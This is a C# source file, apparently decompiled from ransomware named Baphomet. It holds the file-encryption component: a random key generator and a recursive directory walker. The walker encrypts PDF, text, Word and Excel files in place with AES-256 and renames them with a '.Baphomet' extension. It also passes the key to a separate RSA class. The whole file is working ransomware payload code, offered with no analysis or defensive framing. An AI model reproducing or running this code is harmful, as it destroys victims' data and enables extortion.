using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet.Utilities;

public class Cryptep
{
	public string GenerateKey()
	{
		int num = 15;
		string text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < num--)
		{
			stringBuilder.Append(text[random.Next(text.Length)]);
		}
		return stringBuilder.ToString();
	}

	public void directoryRoad(string targetPath, string key)
	{
		CryptRSA cryptRSA = new CryptRSA();
		string[] source = new string[4] { ".pdf", ".txt", ".docx", ".xlsx" };
		cryptRSA.EncryptText(targetPath, key);
		string[] files = Directory.GetFiles(targetPath);
		string[] directories = Directory.GetDirectories(targetPath);
		try
		{
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					encryptFileData(files[i], key, targetPath);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				directoryRoad(directories[j], key);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void encryptFileData(string file, string key, string targetPath)
	{
		byte[] fileBytes = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(key);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = UseAES(fileBytes, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".Baphomet");
	}

	private static byte[] UseAES(byte[] fileBytes, byte[] passw)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using (SymmetricAlgorithm symmetricAlgorithm = new AesManaged())
		{
			symmetricAlgorithm.KeySize = 256;
			symmetricAlgorithm.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passw, salt, 1000);
			symmetricAlgorithm.Key = rfc2898DeriveBytes.GetBytes(symmetricAlgorithm.KeySize / 8);
			symmetricAlgorithm.IV = rfc2898DeriveBytes.GetBytes(symmetricAlgorithm.BlockSize / 8);
			symmetricAlgorithm.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(fileBytes, 0, fileBytes.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}
}
